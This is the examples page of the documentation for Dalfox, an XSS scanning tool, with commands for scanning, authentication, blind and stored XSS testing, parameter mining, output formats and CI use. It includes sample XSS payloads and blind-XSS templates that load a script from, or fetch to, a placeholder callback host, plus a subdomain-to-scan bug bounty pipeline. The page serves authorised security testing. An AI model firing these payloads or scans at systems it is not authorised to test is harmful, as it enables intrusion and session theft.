+++
title = "Examples"
description = "Practical examples for common Dalfox use cases"
weight = 3
sort_by = "weight"

[extra]
+++

This page provides practical examples for common use cases and advanced scenarios.

## Basic XSS Scanning

### Single URL Scan

```bash
# Simple scan
dalfox scan https://example.com

# With specific parameters
dalfox scan "https://example.com?id=1&search=test" -p id -p search

# JSON output
dalfox scan https://example.com -f json -o results.json
```

### Multiple URLs

**From File**:
```bash
dalfox scan -i file urls.txt -f json -o results.json
```

**From Pipe**:
```bash
cat urls.txt | dalfox scan -i pipe
subfinder -d example.com | httpx | dalfox scan -i pipe
```

### POST Requests

**Form Data**:
```bash
dalfox scan https://example.com/api -X POST -d "username=admin&password=test"
```

**JSON Body**:
```bash
dalfox scan https://example.com/api -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"test"}'
```

## Authentication & Headers

### Bearer Token

```bash
dalfox scan https://api.example.com/users \
  -X POST \
  -H "Authorization: Bearer eyJhbGc..." \
  -d '{"name":"test"}'
```

### Session Cookies

```bash
dalfox scan https://example.com \
  --cookies "sessionid=abc123;csrftoken=xyz789"
```

### Custom Headers

```bash
dalfox scan https://example.com \
  -H "X-API-Key: secret" \
  -H "User-Agent: CustomBot/1.0"
```

### From Raw HTTP File

```bash
# Save request from Burp Suite as request.txt
dalfox scan -i raw-http request.txt --cookie-from-raw
```

## Advanced Payloads

### Remote Payloads

```bash
dalfox scan https://example.com \
  --remote-payloads portswigger,payloadbox
```

### Custom Payloads

```bash
# Create custom payload file
cat > payloads.txt << EOF
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
EOF

dalfox scan https://example.com --custom-payload payloads.txt
```

### Only Custom Payloads

```bash
dalfox scan https://example.com \
  --custom-payload payloads.txt \
  --only-custom-payload
```

### Encoders

```bash
# Multiple encoders
dalfox scan https://example.com -e url,html,base64

# No encoding
dalfox scan https://example.com -e none
```

## Blind XSS Testing

### Basic Blind XSS

```bash
dalfox scan https://example.com \
  -b https://your-callback-server.com/xss
```

### With Custom Blind Payloads

```bash
# Create blind payload template file
cat > blind.txt << EOF
<script src="https://your-callback.com/{}"></script>
<img src=x onerror="fetch('https://your-callback.com/{}')">
EOF

dalfox scan https://example.com \
  -b https://your-callback.com/xss \
  --custom-blind-xss-payload blind.txt
```

### With Parameter Mining

```bash
dalfox scan https://example.com \
  -b https://your-callback.com/xss \
  -W params.txt \
  --remote-wordlists burp,assetnote
```

## Stored XSS Testing

### Basic Stored XSS

```bash
# Inject on submit page, verify on view page
dalfox scan https://example.com/comment/submit \
  -X POST \
  -d "comment=test&author=user" \
  --sxss \
  --sxss-url https://example.com/comment/view
```

### With Authentication

```bash
dalfox scan https://example.com/profile/update \
  -X POST \
  -H "Authorization: Bearer token" \
  -d "bio=test&name=user" \
  --sxss \
  --sxss-url https://example.com/profile \
  --sxss-method GET
```

## Parameter Discovery & Mining

### Dictionary-Based Mining

```bash
# Create parameter wordlist
cat > params.txt << EOF
id
search
query
callback
redirect
url
EOF

dalfox scan https://example.com -W params.txt
```

### Remote Wordlists

```bash
dalfox scan https://example.com \
  --remote-wordlists burp,assetnote
```

### Comprehensive Mining

```bash
dalfox scan https://example.com \
  -W params.txt \
  --remote-wordlists burp,assetnote
```

### Skip Discovery/Mining

```bash
# Skip all discovery
dalfox scan https://example.com?id=1 -p id --skip-discovery

# Skip specific discovery types
dalfox scan https://example.com \
  --skip-reflection-header \
  --skip-reflection-cookie
```

## Network & Performance

### With Proxy (Burp Suite)

```bash
dalfox scan https://example.com \
  --proxy http://localhost:8080 \
  -F
```

### Rate Limiting

```bash
# Slow and steady
dalfox scan https://example.com \
  --workers 5 \
  --delay 2000 \
  --timeout 30
```

### High Performance

```bash
# Fast concurrent scanning
dalfox scan -i file urls.txt \
  --workers 200 \
  --max-concurrent-targets 100 \
  --max-targets-per-host 500 \
  --timeout 5
```

### With Timeout & Retries

```bash
dalfox scan https://example.com \
  --timeout 30 \
  --delay 1000
```

## Output Formats

### Plain Text (Default)

```bash
dalfox scan https://example.com
```

### JSON

```bash
dalfox scan https://example.com -f json -o results.json
```

### JSON Lines (JSONL)

```bash
dalfox scan -i file urls.txt -f jsonl -o results.jsonl
```

### Markdown Report

```bash
dalfox scan https://example.com -f markdown -o report.md
```

### SARIF (for CI/CD)

```bash
dalfox scan https://example.com -f sarif -o results.sarif
```

### Include Request/Response

```bash
dalfox scan https://example.com \
  -f json \
  --include-request \
  --include-response \
  -o detailed.json
```

### Silence Mode

```bash
# Only show POCs, no logs
dalfox scan https://example.com -S -f json -o results.json
```

## REST API Mode

### Start Server

```bash
# Basic server
dalfox server

# Production server
dalfox server \
  --host 0.0.0.0 \
  --port 8080 \
  --api-key mysecretkey \
  --log-file /var/log/dalfox.log
```

### Submit Scan via API

**Using curl**:
```bash
curl -X POST http://localhost:6664/scan \
  -H "Content-Type: application/json" \
  -H "X-API-KEY: mysecretkey" \
  -d '{
    "url": "https://example.com",
    "options": {
      "worker": 50,
      "encoders": ["url", "html"]
    }
  }'
# Returns: {"code":200,"msg":"scan_abc123"}
```

### Get Results

```bash
curl http://localhost:6664/result/scan_abc123 \
  -H "X-API-KEY: mysecretkey"
```

**Python Client**:
```python
import requests

# Submit scan
response = requests.post(
    'http://localhost:6664/scan',
    headers={'X-API-KEY': 'mysecretkey'},
    json={
        'url': 'https://example.com',
        'options': {'worker': 50}
    }
)
scan_id = response.json()['msg']

# Get results
results = requests.get(
    f'http://localhost:6664/result/{scan_id}',
    headers={'X-API-KEY': 'mysecretkey'}
).json()
```

## CI/CD Integration

### GitHub Actions

```bash
# Run in CI pipeline
dalfox scan https://staging.example.com \
  -S \
  -f sarif \
  -o results.sarif
```

### GitLab CI

```yaml
security_scan:
  script:
    - dalfox scan $TARGET_URL -S -f json -o results.json
  artifacts:
    reports:
      dalfox: results.json
```

### Jenkins

```bash
dalfox scan https://example.com \
  -S \
  -f json \
  -o ${WORKSPACE}/dalfox-results.json
```

## Advanced Scenarios

### Comprehensive Security Test

```bash
dalfox scan https://example.com \
  -W params.txt \
  --remote-wordlists burp,assetnote \
  --remote-payloads portswigger,payloadbox \
  -e url,html,base64 \
  --custom-payload custom.txt \
  -b https://callback.com/xss \
  --deep-scan \
  -f json \
  --include-request \
  --include-response \
  -o comprehensive.json
```

### Authenticated API Testing

```bash
dalfox scan https://api.example.com/v1/users \
  -X POST \
  -H "Authorization: Bearer ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}' \
  --proxy http://localhost:8080 \
  -F \
  -f json \
  -o api-results.json
```

### Bug Bounty Workflow

```bash
# Discover + mine + test with comprehensive payloads
subfinder -d example.com | \
  httpx -silent | \
  dalfox scan -i pipe \
    --remote-payloads portswigger,payloadbox \
    --remote-wordlists burp \
    -e url,html \
    -f jsonl \
    -o bounty-results.jsonl
```

## See Also

- [Scan Command Reference](/usage/commands/scan)
- [Configuration](/usage/configuration)
- [Performance Optimization](/advanced/performance_optimization)
- [Pipelining](/advanced/pipelining)
